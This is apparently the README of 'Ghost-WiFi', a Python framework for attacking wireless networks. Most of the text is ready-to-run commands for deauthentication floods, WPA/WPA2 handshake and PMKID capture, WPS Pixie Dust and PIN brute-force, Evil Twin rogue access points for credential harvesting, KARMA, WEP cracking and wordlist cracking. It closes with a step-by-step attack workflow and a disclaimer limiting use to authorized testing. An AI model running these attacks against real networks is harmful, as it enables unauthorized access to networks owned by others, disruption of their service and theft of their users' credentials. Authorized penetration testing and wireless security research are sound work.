# Ghost-WiFi

> WiFi attack framework - monitor mode, deauth, WPA/WPA2 handshake capture, PMKID, WPS Pixie Dust, Evil Twin, and cracking.

```
  GHOST-WIFI  v1.0.0  |  WiFi Attack & Audit Framework
  By Gh0st-Bx1        |  github.com/Ghost-Bx1
```

![Python](https://img.shields.io/badge/Python-3.7%2B-blue?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-Linux-lightgrey?style=flat-square)
![Category](https://img.shields.io/badge/Category-WiFi%20Security-red?style=flat-square)

---

## Overview

Ghost-WiFi is a comprehensive WiFi attack and audit framework. It wraps the full aircrack-ng suite with clean CLI ergonomics, adds PMKID (clientless WPA2), WPS Pixie Dust/PIN brute-force, Evil Twin AP setup, KARMA attack, channel hopping, client tracking, WEP cracking, and offline handshake cracking via aircrack-ng or hashcat.

| Module       | Technique                                                      |
|--------------|----------------------------------------------------------------|
| `ifaces`     | List wireless interfaces, mode, driver, MAC                   |
| `monitor`    | Start/stop/check monitor mode via airmon-ng                   |
| `scan`       | Passive AP + client scan with airodump-ng, JSON export        |
| `hop`        | Channel hopping across selected channels                      |
| `deauth`     | 802.11 deauthentication flood (broadcast or targeted)         |
| `capture`    | WPA/WPA2 4-way handshake capture with auto deauth trigger     |
| `pmkid`      | Clientless PMKID capture with hcxdumptool + hashcat export    |
| `wps`        | WPS scan, Pixie Dust (reaver -K), PIN brute-force, bully      |
| `evil-twin`  | Rogue AP with hostapd + dnsmasq DHCP, captive portal ready    |
| `crack`      | Offline cracking via aircrack-ng (CPU) or hashcat (GPU)       |
| `wep`        | WEP cracking: ARP injection, fragmentation, chop-chop         |
| `clients`    | Track clients per AP, log MACs and probed ESSIDs              |
| `karma`      | KARMA attack - respond to all probe requests                  |
| `handshake`  | Verify, convert (.hc22000/.hccapx), or strip capture files   |
| `info`       | Dependency checker - shows installed/missing tools            |

---

## Requirements

```
Python 3.7+
Linux only (requires raw socket / monitor mode support)

Core (required):
  aircrack-ng   - airmon-ng, airodump-ng, aireplay-ng, aircrack-ng

Optional by module:
  reaver        - WPS Pixie Dust and PIN brute-force
  bully         - Alternative WPS attacker
  hcxdumptool   - PMKID clientless capture
  hcxtools      - hcxpcapngtool, cap2hccapx conversion
  hashcat       - GPU-accelerated cracking (mode 22000 / 2500)
  hostapd       - Evil Twin AP daemon
  dnsmasq       - Evil Twin DHCP/DNS
  bettercap     - KARMA, MITM framework
  macchanger    - MAC address randomization
  john          - CPU-based hash cracking
```

```bash
# Install core + common extras (Debian/Ubuntu/Kali):
sudo apt install aircrack-ng reaver bully hcxdumptool hcxtools \
                 hashcat hostapd dnsmasq bettercap macchanger
```

---

## Installation

```bash
git clone https://github.com/Ghost-Bx1/ghost-wifi
cd ghost-wifi
python ghost-wifi.py info
```

---

## Usage

### Check dependencies

```bash
python ghost-wifi.py info
```

### List interfaces

```bash
python ghost-wifi.py ifaces
```

### Enable monitor mode

```bash
sudo python ghost-wifi.py monitor -i wlan0 --action start
# Stop:
sudo python ghost-wifi.py monitor -i wlan0mon --action stop
```

### Scan for APs and clients

```bash
# 30-second passive scan
sudo python ghost-wifi.py scan -i wlan0mon --duration 30

# Save to JSON
sudo python ghost-wifi.py scan -i wlan0mon --duration 60 -o scan.json

# 5GHz only
sudo python ghost-wifi.py scan -i wlan0mon --band a
```

### Deauthentication attack

```bash
# Broadcast deauth (kick all clients from AP)
sudo python ghost-wifi.py deauth -i wlan0mon --bssid AA:BB:CC:DD:EE:FF

# Target specific client, 10 frames
sudo python ghost-wifi.py deauth -i wlan0mon --bssid AA:BB:CC:DD:EE:FF \
    --client 11:22:33:44:55:66 --count 10 --channel 6
```

### Capture WPA/WPA2 handshake

```bash
# Auto deauth + capture
sudo python ghost-wifi.py capture -i wlan0mon \
    --bssid AA:BB:CC:DD:EE:FF --essid "HomeNetwork" --channel 6

# Passive mode only (no deauth)
sudo python ghost-wifi.py capture -i wlan0mon \
    --bssid AA:BB:CC:DD:EE:FF --channel 6 --passive --timeout 180

# Output prefix
sudo python ghost-wifi.py capture -i wlan0mon \
    --bssid AA:BB:CC:DD:EE:FF --channel 6 -o home_capture
```

### PMKID attack (clientless WPA2)

```bash
# Capture PMKID from all APs (60s)
sudo python ghost-wifi.py pmkid -i wlan0mon --duration 60

# Target specific AP, save to file
sudo python ghost-wifi.py pmkid -i wlan0mon \
    --bssid AA:BB:CC:DD:EE:FF --duration 90 -o pmkid.pcapng
```

### WPS attacks

```bash
# Scan for WPS-enabled APs
sudo python ghost-wifi.py wps -i wlan0mon --action scan

# Pixie Dust attack (fastest, seconds to minutes)
sudo python ghost-wifi.py wps -i wlan0mon --bssid AA:BB:CC:DD:EE:FF \
    --channel 6 --action pixie

# PIN brute-force (slow, use Pixie Dust first)
sudo python ghost-wifi.py wps -i wlan0mon --bssid AA:BB:CC:DD:EE:FF \
    --channel 6 --action pin

# Bully (alternative WPS attacker)
sudo python ghost-wifi.py wps -i wlan0mon --bssid AA:BB:CC:DD:EE:FF \
    --channel 6 --action bully
```

### Evil Twin / Rogue AP

```bash
# Create rogue AP matching target network
sudo python ghost-wifi.py evil-twin -i wlan0 --essid "CoffeeShop_Free" --channel 6

# With BSSID spoofing
sudo python ghost-wifi.py evil-twin -i wlan0 \
    --essid "HomeNetwork" --bssid AA:BB:CC:DD:EE:FF --channel 11
```

Clients that connect receive DHCP from 192.168.1.x. Combine with a captive portal for credential harvesting in authorized red team assessments.

### Crack handshake offline

```bash
# aircrack-ng (CPU)
python ghost-wifi.py crack --cap capture-01.cap --wordlist /usr/share/wordlists/rockyou.txt

# hashcat (GPU, mode 22000 = WPA2)
python ghost-wifi.py crack --cap hashes.hc22000 --hashcat \
    --wordlist /usr/share/wordlists/rockyou.txt

# With hashcat rules
python ghost-wifi.py crack --cap hashes.hc22000 --hashcat \
    --wordlist wordlist.txt --rules /usr/share/hashcat/rules/best64.rule
```

### WEP cracking

```bash
# ARP injection (fastest)
sudo python ghost-wifi.py wep -i wlan0mon \
    --bssid AA:BB:CC:DD:EE:FF --channel 6 --attack arp

# Fragmentation
sudo python ghost-wifi.py wep -i wlan0mon \
    --bssid AA:BB:CC:DD:EE:FF --channel 6 --attack frag

# ChopChop
sudo python ghost-wifi.py wep -i wlan0mon \
    --bssid AA:BB:CC:DD:EE:FF --channel 6 --attack chopchop
```

### Client tracking

```bash
# Track all clients (all APs)
sudo python ghost-wifi.py clients -i wlan0mon --duration 60

# Track clients of specific AP
sudo python ghost-wifi.py clients -i wlan0mon \
    --bssid AA:BB:CC:DD:EE:FF --channel 6 --duration 120 -o clients.json
```

### KARMA attack

```bash
# Respond to all probe requests
sudo python ghost-wifi.py karma -i wlan0mon
```

### Channel hopping

```bash
# Hop all 2.4GHz channels
sudo python ghost-wifi.py hop -i wlan0mon

# Hop specific channels, fast
sudo python ghost-wifi.py hop -i wlan0mon --channels 1,6,11 --delay 0.3
```

### Handshake tools

```bash
# Verify handshake in capture
python ghost-wifi.py handshake --cap capture-01.cap --action verify

# Convert to hashcat format (.hc22000)
python ghost-wifi.py handshake --cap capture-01.cap --action convert -o hashes.hc22000

# Strip non-handshake packets
python ghost-wifi.py handshake --cap capture-01.cap --action strip -o clean.cap
```

---

## Reference

### Global flags

| Flag              | Description                        |
|-------------------|------------------------------------|
| `-v / --verbose`  | Verbose output                     |
| `-o / --output`   | Save results to JSON/file          |
| `--no-banner`     | Suppress the startup banner        |

### `scan` flags

| Flag              | Description                                            |
|-------------------|--------------------------------------------------------|
| `-i / --interface`| Monitor mode interface                                 |
| `--channel N`     | Lock to channel N                                      |
| `--band`          | a (5GHz), b (2.4GHz), abg (both)                      |
| `--duration N`    | Scan duration in seconds (default: 30)                 |

### `deauth` flags

| Flag              | Description                                            |
|-------------------|--------------------------------------------------------|
| `-i / --interface`| Monitor mode interface (required)                      |
| `--bssid`         | Target AP MAC address (required)                       |
| `--client`        | Target client MAC (default: broadcast FF:FF:FF:FF:FF:FF)|
| `--count N`       | Number of deauth frames (0 = continuous)               |
| `--channel N`     | AP channel                                             |

### `capture` flags

| Flag              | Description                                            |
|-------------------|--------------------------------------------------------|
| `-i / --interface`| Monitor mode interface (required)                      |
| `--bssid`         | Target AP MAC (required)                               |
| `--essid`         | AP name (for display)                                  |
| `--channel N`     | AP channel                                             |
| `--passive`       | No deauth - passive capture only                       |
| `--timeout N`     | Max wait time in seconds (default: 120)                |

### `wps` flags

| Flag              | Description                                            |
|-------------------|--------------------------------------------------------|
| `--action`        | scan, pixie, pin, bully                                |
| `--bssid`         | Target AP MAC                                          |
| `--channel N`     | AP channel                                             |
| `--pin`           | Known PIN to test (pin action)                         |

### `crack` flags

| Flag              | Description                                            |
|-------------------|--------------------------------------------------------|
| `--cap`           | Capture file (.cap, .hc22000)                          |
| `--wordlist`      | Wordlist file (default: built-in mini-list)            |
| `--hashcat`       | Use hashcat instead of aircrack-ng                     |
| `--hash-mode N`   | Hashcat mode (default: 22000 for WPA2)                 |
| `--rules FILE`    | Hashcat rules file                                     |

---

## Attack Workflow

### WPA2 Personal (fastest path)

```bash
# 1. Enable monitor mode
sudo python ghost-wifi.py monitor -i wlan0 --action start

# 2. Scan for target
sudo python ghost-wifi.py scan -i wlan0mon --duration 30

# 3a. PMKID (clientless, no deauth needed)
sudo python ghost-wifi.py pmkid -i wlan0mon --bssid TARGET_BSSID -o pmkid.pcapng
python ghost-wifi.py crack --cap pmkid.hc22000 --hashcat --wordlist rockyou.txt

# 3b. Handshake capture (requires active client)
sudo python ghost-wifi.py capture -i wlan0mon --bssid TARGET_BSSID --channel 6 -o capture
python ghost-wifi.py crack --cap capture-01.cap --wordlist rockyou.txt
```

### WPS target

```bash
sudo python ghost-wifi.py wps -i wlan0mon --action scan
sudo python ghost-wifi.py wps -i wlan0mon --bssid TARGET_BSSID --channel 6 --action pixie
```

## Ghost Toolkit

| Tool | Description |
|------|-------------|
| [ghost-ad](https://github.com/Ghost-Bx1/ghost-ad) | Active Directory - LDAP, Kerberoasting, AS-REP Roasting, BloodHound-lite |
| [ghost-cloud](https://github.com/Ghost-Bx1/ghost-cloud) | Cloud Security - AWS, Azure and GCP misconfiguration scanner |
| [ghost-fuzz](https://github.com/Ghost-Bx1/ghost-fuzz) | Web Fuzzing - directory brute-force, parameter fuzzing, vhost enumeration |
| [ghost-osint](https://github.com/Ghost-Bx1/ghost-osint) | OSINT - domain, email and IP intelligence from public sources |
| [ghost-privesc](https://github.com/Ghost-Bx1/ghost-privesc) | Privilege Escalation - Linux privesc checker, 17 vectors, GTFOBins |
| [ghost-recon](https://github.com/Ghost-Bx1/ghost-recon) | Reconnaissance - DNS, SSL, WAF, subdomain enumeration, email security |
| [ghost-report](https://github.com/Ghost-Bx1/ghost-report) | Reporting - pentest report generator from any ghost-* JSON output |
| [ghost-scan](https://github.com/Ghost-Bx1/ghost-scan) | Port Scanner - async TCP/UDP scanner with banner grabbing and CVE correlation |
| [ghost-shell](https://github.com/Ghost-Bx1/ghost-shell) | Payload Generation - reverse shell and web shell generator, 25+ languages |
| [ghost-spray](https://github.com/Ghost-Bx1/ghost-spray) | Credential Attacks - password spraying, stuffing, default credential testing |
| [ghost-wifi](https://github.com/Ghost-Bx1/ghost-wifi) | WiFi Attacks - monitor mode, deauth, WPA/WPA2 capture, PMKID, WPS, Evil Twin |

---

## Disclaimer

For use in authorized environments only. Penetration testing, CTF competitions, and wireless security research with explicit permission from the network owner. WiFi attacks against networks you do not own or have written authorization to test are illegal in most jurisdictions. The author is not responsible for misuse.

---

**By [Gh0st-Bx1](https://github.com/Ghost-Bx1)**
